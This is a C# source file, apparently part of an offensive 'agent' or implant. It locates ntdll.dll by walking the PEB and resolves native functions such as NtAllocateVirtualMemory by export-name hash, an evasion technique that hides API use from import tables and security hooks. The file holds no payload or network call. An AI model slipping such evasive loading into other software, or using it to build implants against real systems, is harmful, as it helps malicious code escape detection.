using System;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    public class NtdllApi
    {
        public delegate int RtlGetVersionDelegate(ref OSVERSIONINFOW versionInfo);
        public delegate int NtQuerySystemInformationDelegate(int systemInformationClass, IntPtr systemInformation, uint systemInformationLength, out uint returnLength);
        public delegate IntPtr RtlAllocateHeapDelegate(IntPtr heapHandle, uint flags, UIntPtr size);
        public delegate bool RtlFreeHeapDelegate(IntPtr heapHandle, uint flags, IntPtr memoryPointer);
        public delegate int NtAllocateVirtualMemoryDelegate(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref UIntPtr regionSize, uint allocationType, uint protect);

        public RtlGetVersionDelegate RtlGetVersion;
        public NtQuerySystemInformationDelegate NtQuerySystemInformation;
        public RtlAllocateHeapDelegate RtlAllocateHeap;
        public RtlFreeHeapDelegate RtlFreeHeap;
        public NtAllocateVirtualMemoryDelegate NtAllocateVirtualMemory;

        public IntPtr ModuleHandle;

        private NtdllApi(
            IntPtr moduleHandle,
            RtlGetVersionDelegate rtlGetVersion,
            NtQuerySystemInformationDelegate zwQuerySystemInformation,
            RtlAllocateHeapDelegate rtlAllocateHeap,
            RtlFreeHeapDelegate rtlFreeHeap,
            NtAllocateVirtualMemoryDelegate ntAllocateVirtualMemory)
        {
            ModuleHandle = moduleHandle;
            RtlGetVersion = rtlGetVersion;
            NtQuerySystemInformation = zwQuerySystemInformation;
            RtlAllocateHeap = rtlAllocateHeap;
            RtlFreeHeap = rtlFreeHeap;
            NtAllocateVirtualMemory = ntAllocateVirtualMemory;
        }

        public static bool TryCreateNtdll(out NtdllApi instance)
        {
            instance = null;
            IntPtr pebAddress = PebWalker.GetPebAddress();
            IntPtr moduleHandle = PebWalker.ResolveModuleFromPeb("ntdll.dll");
            if (moduleHandle == IntPtr.Zero)
                return false;

            IntPtr ptrRtlGetVersion = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("RtlGetVersion"));
            if (ptrRtlGetVersion == IntPtr.Zero)
                return false;

            RtlGetVersionDelegate rtlGetVersion = Marshal.GetDelegateForFunctionPointer<RtlGetVersionDelegate>(ptrRtlGetVersion);
            IntPtr ptrNtQuerySystemInformation = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("NtQuerySystemInformation"));
            if (ptrNtQuerySystemInformation == IntPtr.Zero)
                return false;

            NtQuerySystemInformationDelegate ntQuerySystemInformation = Marshal.GetDelegateForFunctionPointer<NtQuerySystemInformationDelegate>(ptrNtQuerySystemInformation);
            IntPtr ptrRtlAllocateHeap = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("RtlAllocateHeap"));
            if (ptrRtlAllocateHeap == IntPtr.Zero)
                return false;

            RtlAllocateHeapDelegate rtlAllocateHeap = Marshal.GetDelegateForFunctionPointer<RtlAllocateHeapDelegate>(ptrRtlAllocateHeap);
            IntPtr ptrRtlFreeHeap = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("RtlFreeHeap"));
            if (ptrRtlFreeHeap == IntPtr.Zero)
                return false;
            IntPtr ptrNtAllocateVirtualMemory = PebWalker.ResolveExportByHash(moduleHandle, PebWalker.HashString("NtAllocateVirtualMemory"));
            if (ptrNtAllocateVirtualMemory == IntPtr.Zero)
                return false;

            NtAllocateVirtualMemoryDelegate ntAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemoryDelegate>(ptrNtAllocateVirtualMemory);
            RtlFreeHeapDelegate rtlFreeHeap = Marshal.GetDelegateForFunctionPointer<RtlFreeHeapDelegate>(ptrRtlFreeHeap);

            instance = new NtdllApi(
                moduleHandle,
                rtlGetVersion,
                ntQuerySystemInformation,
                rtlAllocateHeap,
                rtlFreeHeap,
                ntAllocateVirtualMemory
            );

            return true;
        }
    }
}